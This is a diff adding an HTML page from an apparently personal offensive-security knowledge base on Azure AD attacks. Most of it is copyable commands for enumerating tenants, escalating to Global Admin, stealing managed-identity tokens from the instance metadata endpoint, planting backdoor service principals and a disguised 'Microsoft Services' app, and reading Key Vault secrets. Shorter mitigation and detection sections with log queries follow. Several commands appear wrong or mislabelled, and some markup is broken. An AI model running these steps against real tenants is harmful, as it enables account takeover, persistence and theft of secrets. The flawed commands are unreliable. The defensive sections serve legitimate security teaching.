@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Azure AD Attacks | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-critical { background: rgba(255,68,68,0.2); color: #ff4444; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    @media (max-width: 768px) { .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="index.html">Cloud Security</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="index.html">Cloud Security</a> / Azure AD Attacks
+    </div>
+
+    <div class="page-header">
+      <span class="severity-badge severity-critical"><i class="fas fa-exclamation-triangle"></i> Critical Severity | T1078</span>
+      <h1>☁️ Azure AD Attack Techniques</h1>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><strong>MITRE</strong><span>T1078</span></div>
+        <div class="meta-item"><strong>Platform</strong><span>Azure AD</span></div>
+        <div class="meta-item"><strong>Phase</strong><span>Credential Access</span></div>
+        <div class="meta-item"><strong>Difficulty</strong><span>Medium-High</span></div>
+      </div>
+    </div>
+
+    <!-- 1. DESCRIPTION -->
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p>Azure Active Directory (Azure AD) is Microsoft's cloud-based identity and access management service. Attacks against Azure AD target authentication mechanisms, service principals, managed identities, and application permissions to gain unauthorized access and persist in the cloud environment.</p>
+      
+      <div class="vulnerability-box">
+        <strong>Why Azure AD is Targeted:</strong>
+        <ul>
+          <li><strong>Single Sign-On:</strong> Compromising Azure AD grants access to many apps</li>
+          <li><strong>Service Principals:</strong> Often have excessive permissions</li>
+          <li><strong>Managed Identities:</strong> Can be abused for privilege escalation</li>
+          <li><strong>Legacy Integrations:</strong> Sync from on-prem AD exposes hybrid flaws</li>
+          <li><strong>Application OAuth:</strong> Malicious app registrations for persistence</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- 2. ENUMERATION -->
+    <div class="content-section" id="enumeration">
+      <h2>🔍 Azure AD Enumeration</h2>
+      
+      <p><strong>Azure CLI Setup:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Install Azure CLI
+curl -sL https://aka.ms/install-azure-cli | bash
+
+# Login
+az login
+
+# Show current tenant info
+az ad signed-in-user show
+az account tenant list
+
+# List subscriptions
+az account list --all</pre>
+      </div>
+
+      <p><strong>User Enumeration:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># List all users
+az ad user list --query '[].{displayName:displayName,mail:mail,userType:userType}' -o table
+
+# Get specific user
+az ad user show --id user@company.com
+
+# List groups
+az ad group list --query '[].{displayName:displayName,description:description}' -o table
+
+# List group members
+az ad group member list --group-id <group-id>
+
+# List service principals
+az ad sp list --query '[].{displayName:displayName,appId:appId}' -o table</pre>
+      </div>
+
+      <p><strong>Application Enumeration:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># List enterprise applications
+az ad app list --query '[].{displayName:displayName,appId:appId}' -o table
+
+# Get app permissions
+az ad app permission list --id <app-id>
+
+# List delegated permissions
+az ad app show --id <app-id> --query 'oauth2Permissions'
+
+# Check app roles
+az role assignment list --assignee <app-id></pre>
+      </div>
+
+      <p><strong>Role Assignments:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># List role assignments
+az role assignment list --all --output table
+
+# List built-in roles
+az role definition list --query '[].{name:name,description:description}' -o table
+
+# Get permissions for a role
+az role definition list --name "Contributor"
+
+# Scope: subscription, resource group, or resource</pre>
+      </div>
+    </div>
+
+    <!-- 3. PRIVILEGE ESCALATION -->
+    <div class="content-section" id="privesc">
+      <h2>🔓 Privilege Escalation</h2>
+      
+      <p><strong>Technique 1: Service Principal Key Creation:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check if you can create credentials on service principals
+az ad sp credential list --id <sp-id>
+
+# Add credential to service principal
+az ad sp credential list --id <sp-object-id>
+
+# If you have app permission
+az ad sp credential delete --id <sp-id> --key-id <key-id>
+
+# Create new password credential
+az ad sp credential reset --id <sp-id> --append</pre>
+      </div>
+
+      <p><strong>Technique 2: Add Owner to Application:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check if you can add owners
+az role assignment create \
+    --role "Owner" \
+    --assignee <your-sp-or-user> \
+    --scope /applications/<app-id>
+
+# Add yourself as owner to app
+az ad app owner add --id <app-id> --owner-object-id <your-object-id></pre>
+      </div>
+
+      <p><strong>Technique 3: Assign Application Admin Role:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># List available role assignments
+az role assignment list --scope /providers/Microsoft.MachineLearningServices
+
+# Grant application admin
+az role assignment create \
+    --role "Application Admin" \
+    --assignee <sp-id> \
+    --scope /tenant
+
+# Or global admin
+az role assignment create \
+    --role "Global Admin" \
+    --assignee <sp-id> \
+    --scope /tenant</pre>
+      </div>
+
+      <p><strong>Technique 4: Exploit Logic App Managed Identity:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check for Logic Apps with system-assigned identity
+az logic workflow show --resource-group MyResourceGroup --name MyWorkflow
+
+# If Logic App has contributor role on RG, escalate
+az resource update --ids /subscriptions/xxx/resourceGroups/RG/providers/Microsoft.Logic/workflows/LogicApp
+
+# Get token via managed identity
+curl -X POST http://169.254.169.254/metadata/identity/oauth2/token \
+    -H "Metadata: true" \
+    -d "resource=https://management.azure.com/"</pre>
+      </div>
+    </div>
+
+    <!-- 4. MANAGED IDENTITY EXPLOITATION -->
+    <div class="content-section" id="managed-identity">
+      <h2>🔑 Managed Identity Exploitation</h2>
+      
+      <p><strong>Azure Instance Metadata Service (IMDS):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Get access token from VM with managed identity
+curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H "Metadata:true"
+
+# Or for specific resource
+curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/' -H "Metadata:true"
+
+# Get IMDSv2 token (requires token)
+curl -X PUT 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H "X-IDENTITY-HEADER: $IDENTITY_TOKEN"</pre>
+      </div>
+
+      <p><strong>From Azure Functions/Lambda Equivalent:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre# Python example for Azure Functions
+import os
+import requests
+
+def main(req):
+    token = os.environ.get('IDENTITY_ENDPOINT') + "?api-version=2019-08-01"
+    headers = {'X-IDENTITY-HEADER': os.environ.get('IDENTITY_HEADER')}
+    
+    response = requests.get(token, headers=headers)
+    access_token = response.json()['access_token']
+    
+    # Use token to list resources
+    # ...
+    
+    return {'status': 'done'}
+
+# The function's managed identity has permissions</pre>
+      </div>
+
+      <p><strong>Privilege Escalation via VM Managed Identity:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># If VM has "Contributor" on subscription
+# You can execute code on VM (via RCE or existing access)
+# Then extract managed identity token and call Azure API
+
+# Use Azure management API to:
+# 1. Create new user
+# 2. Add yourself to Global Admin
+# 3. Create new service principal
+# 4. Assign roles to yourself</pre>
+      </div>
+    </div>
+
+    <!-- 5. PERSISTENCE -->
+    <div class="content-section" id="persistence">
+      <h2>🎯 Persistence Mechanisms</h2>
+      
+      <p><strong>1. Malicious Application Registration:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Register an application
+az ad app create \
+    --display-name "Microsoft Services" \
+    --password "SuperSecret123!" \
+    --required-resource-access '[
+      {"resourceAppId":"00000003-0000-0000-c000-000000000000","resourceAccess":[
+        {"id":"e1fe6f66-5d27-4d38-976d-xxxxxxxxxxxx","type":"Role"}
+      ]}
+    ]'
+
+# Add credential (stays even after password reset)
+az ad sp credential reset --id <app-id> --append
+
+# Grant admin consent
+az ad app permission admin-consent --id <app-id></pre>
+      </div>
+
+      <p><strong>2. Service Principal Backdoor:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create service principal with high permissions
+az ad sp create-for-rbac --role Contributor --scope /subscriptions/<sub-id>
+
+# Or with more privileges
+az ad sp create-for-rbac --role "User Access Administrator" --scope /subscriptions/<sub-id>
+
+# Save the output - this is your backdoor
+# {
+#   "appId": "...",
+#   "password": "...",
+#   "tenant": "..."
+# }</pre>
+      </div>
+
+      <p><strong>3. Add Backdoor to Existing App:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre# Add additional password credential to existing app
+az ad sp credential reset --id <existing-sp-id> --append
+
+# Or add owner to app
+az ad app owner add --id <app-id> --owner-object-id <your-user-id></pre>
+      </div>
+
+      <p><strong>4. Role Assignment on Subscription:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre# Grant yourself a role on the subscription
+az role assignment create \
+    --role "Contributor" \
+    --assignee-object-id <your-user-object-id> \
+    --scope /subscriptions/<subscription-id>
+
+# Use for persistent access</pre>
+      </div>
+    </div>
+
+    <!-- 6. LATERAL MOVEMENT -->
+    <div class="content-section" id="lateral">
+      <h2>🚀 Lateral Movement</h2>
+      
+      <p><strong>Accessing Resources:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre# List storage accounts
+az storage account list --query '[].name' -o table
+
+# List key vaults
+az keyvault list --query '[].name' -o table
+
+# Access key vault
+az keyvault secret list --name <vault-name>
+az keyvault secret show --name <secret-name> --vault-name <vault-name>
+
+# List VMs
+az vm list --query '[].name' -o table
+
+# List web apps
+az webapp list --query '[].name' -o table</pre>
+      </div>
+
+      <p><strong>Access Azure SQL:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre# List SQL servers
+az sql server list --query '[].fullyQualifiedDomainName' -o table
+
+# Connect using service principal
+# Use Azure AD authentication
+sqlcmd -S server.database.windows.net -d master -G
+
+# Or get connection string from Key Vault
+az keyvault secret show --name <conn-str-secret> --vault-name <vault></pre>
+      </div>
+
+      <p><strong>Container Registry Access:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre# List container registries
+az acr list --query '[].loginServer' -o table
+
+# Login to registry
+az acr login --name <registry-name>
+
+# List images
+az acr repository list --name <registry-name>
+
+# Pull image
+docker pull <registry>.azurecr.io/image:tag</pre>
+      </div>
+    </div>
+
+    <!-- 7. MITIGATION -->
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ Mitigation</h2>
+
+      <div class="mitigation-box">
+        <strong>✅ Security Best Practices:</strong>
+        <ul>
+          <li><strong>Conditional Access:</strong> Require MFA for all admin access</li>
+          <li><strong>Privileged Identity Management:</strong> Use just-in-time access</li>
+          <li><strong>Disable IMDS:</strong> For VMs that don't need it</li>
+          <li><strong>Audit Service Principals:</strong> Remove unused credentials</li>
+          <li><strong>App Registration Restrictions:</strong> Limit who can create apps</li>
+          <li><strong>Monitor Role Assignments:</strong> Alert on Global Admin changes</li>
+        </ul>
+      </div>
+
+      <p><strong>Azure AD Security Center Recommendations:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check security recommendations
+az security recommendation list --query '[].{name:name,category:category}' -o table
+
+# Enable PIM for admin roles
+az role assignment create \
+    --role "Privileged Role Administrator" \
+    --assignee-object-id <user-id> \
+    --scope /tenants/<tenant-id>
+
+# Disable legacy authentication
+az ad set-user-legacy-auth-status --id <user-id> --disable-legacy-authentication</pre>
+      </div>
+    </div>
+
+    <!-- 8. DETECTION -->
+    <div class="content-section" id="detection">
+      <h2>🔍 Detection</h2>
+
+      <p><strong>Azure AD Sign-In Logs:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Use Log Analytics for Azure AD
+# Query unusual sign-ins
+SigninLogs
+| where TimeGenerated > ago(1d)
+| where ResultType != 0
+| where AppId == "797f4846-0000-0000-0000-000000000000"
+| project TimeGenerated, UserPrincipalName, IPAddress, Location, ResultDescription
+
+# Suspicious app registrations
+AuditLogs
+| where OperationName == "Add application"
+| where Result == "success"
+| project TimeGenerated, ActorName, TargetResources
+
+# New owner added
+AuditLogs
+| where OperationName == "Add owner to application"
+| project TimeGenerated, ActorName, TargetResources</pre>
+      </div>
+
+      <p><strong>Azure Sentinel Detection Rules:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre# Detect service principal abuse
+AuditLogs
+| where Category == "ApplicationManagement"
+| where OperationName in ("Add service principal credentials",
+                           "Update application",
+                           "Add owner to application")
+| extend ServicePrincipalName = tostring(TargetResources[0].displayName)
+| project TimeGenerated, ActorName, OperationName, ServicePrincipalName
+
+# Detect role assignment to external users
+AuditLogs
+| where OperationName == "Add member to role"
+| extend TargetUser = tostring(TargetResources[0].displayName)
+| where TargetUser contains "@gmail.com" or TargetUser contains "@outlook.com"</pre>
+      </div>
+    </div>
+
+    <!-- 9. TOOLS -->
+    <div class="content-section" id="tools">
+      <h2>🛠️ Tools</h2>
+
+      <div class="info-box">
+        <strong>Azure Attack Tools:</strong>
+        <ul>
+          <li><strong>MicroBurst:</strong> Azure enumeration and exploitation</li>
+          <li><strong>Stormspotter:</strong> Azure red team tool</li>
+          <li><strong>AzureHound:</strong> Azure AD attack tool (similar to BloodHound)</li>
+          <li><strong>PowerZure:</strong> Azure exploitation framework</li>
+        </ul>
+      </div>
+
+      <p><strong>PowerZure Examples:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>Import-Module PowerZure
+Connect-Azure -Account <creds>
+
+# Enumerate
+Get-AzureTargets
+Get-AzureRoles
+Get-AzureUsers
+Get-AzureResources
+
+# Exploit
+Get-AzureVMExecute -ResourceGroup <rg> -VMName <vm>
+Get-AzureVMImmersive -ResourceGroup <rg> -VMName <vm></pre>
+      </div>
+
+      <p><strong>MicroBurst:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>Import-Module .\MicroBurst.ps1
+
+# Enumerate
+Get-AzurePasswords
+Get-AzureAppInfo
+Get-AzureUsers
+
+# Blasting
+Invoke-AzureEnum -App secret
+Get-AzureBlobFiles -base <company></pre>
+      </div>
+    </div>
+
+    <!-- 10. REFERENCES -->
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://hausec.com/2022/09/12/azure-ad-pentesting/" target="_blank">Azure AD Pentesting Guide</a></li>
+        <li><a href="https://www.securecloudarchitect.com/post/azure-ad-privilege-escalation" target="_blank">Azure AD Privilege Escalation</a></li>
+        <li><a href="https://github.com/dirkjanm/ROADtools" target="_blank">ROADtools</a></li>
+        <li><a href="https://github.com/NetSPI/MicroBurst" target="_blank">MicroBurst</a></li>
+        <li><a href="https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/" target="_blank">Azure AD Documentation</a></li>
+      </ul>
+    </div>
+
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Cloud Security</a>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) {
+    mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show'));
+  }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) {
+        icon.classList.remove('fa-moon');
+        icon.classList.add('fa-sun');
+        text.textContent = 'Light';
+      } else {
+        icon.classList.remove('fa-sun');
+        icon.classList.add('fa-moon');
+        text.textContent = 'Dark';
+      }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  const savedTheme = localStorage.getItem('theme-preference');
+  if (savedTheme === 'light') document.body.classList.add('light');
+});
+
+function copyCode(btn) {
+  const code = btn.parentElement.querySelector('pre').innerText;
+  navigator.clipboard.writeText(code);
+  btn.textContent = 'Copied!';
+  setTimeout(() => { btn.textContent = 'Copy'; }, 2000);
+}
+</script>
+
+</body>
+</html>
